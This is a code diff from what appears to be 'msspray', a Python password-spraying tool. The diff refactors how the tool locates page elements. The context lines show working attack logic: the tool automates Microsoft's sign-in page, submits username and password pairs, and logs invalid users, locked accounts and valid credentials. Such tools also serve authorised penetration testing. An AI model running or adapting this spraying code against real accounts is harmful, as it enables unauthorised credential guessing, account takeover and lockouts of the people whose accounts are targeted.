@@ -7,6 +7,7 @@ from msspray.utils import (
     firefox,
     utils,
 )
+from msspray.utils.elements import Elements
 from msspray.utils.logger import text_colors
 
 
@@ -53,21 +54,19 @@ def spray(args: argparse.Namespace):
                 # Populate the username field and click 'Next'
                 browser.populate_element(
                     browser.find_element(
-                        firefox.ELEMENTS["type"], firefox.ELEMENTS["username"]
+                        Elements.username.type, Elements.username.value
                     ),
                     username,
                 )
                 browser.click(
-                    browser.is_clickable(
-                        firefox.ELEMENTS["type"], firefox.ELEMENTS["next"]
-                    )
+                    browser.is_clickable(Elements.next.type, Elements.next.value)
                 )
 
                 time.sleep(1)  # Ensure the previous DOM is stale
 
                 # Handle invalid usernames
                 if browser.find_element(
-                    firefox.ELEMENTS["type"], firefox.ELEMENTS["usererror"]
+                    Elements.usererror.type, Elements.usererror.value
                 ):
                     logging.info(
                         f"[{text_colors.FAIL}INVALID_USER{text_colors.ENDC}] "
@@ -79,9 +78,7 @@ def spray(args: argparse.Namespace):
                 else:
 
                     # Check if Microsoft prompts for work/personal account
-                    if browser.find_element(
-                        firefox.ELEMENTS["type"], firefox.ELEMENTS["work"]
-                    ):
+                    if browser.find_element(Elements.work.type, Elements.work.value):
                         # Select Work
                         browser.execute_script(
                             'document.getElementById("aadTile").click()'
@@ -91,21 +88,19 @@ def spray(args: argparse.Namespace):
                     # Populate the password field and click 'Sign In'
                     browser.populate_element(
                         browser.find_element(
-                            firefox.ELEMENTS["type"], firefox.ELEMENTS["password"]
+                            Elements.password.type, Elements.password.value
                         ),
                         password,
                     )
                     browser.click(
-                        browser.is_clickable(
-                            firefox.ELEMENTS["type"], firefox.ELEMENTS["login"]
-                        )
+                        browser.is_clickable(Elements.login.type, Elements.login.value)
                     )
 
                     time.sleep(1)  # Ensure the previous DOM is stale
 
                     # Check if account is locked out
                     if browser.find_element(
-                        firefox.ELEMENTS["type"], firefox.ELEMENTS["locked"]
+                        Elements.locked.type, Elements.locked.value
                     ):
                         logging.info(
                             f"[{text_colors.FAIL}LOCKED{text_colors.ENDC}] {username}"
@@ -116,7 +111,7 @@ def spray(args: argparse.Namespace):
 
                         # Check for invalid password or account lock outs
                         if not browser.find_element(
-                            firefox.ELEMENTS["type"], firefox.ELEMENTS["passerror"]
+                            Elements.passerror.type, Elements.passerror.value
                         ):
                             logging.info(
                                 f"[{text_colors.OKGREEN}VALID{text_colors.ENDC}] {username}:{password}"
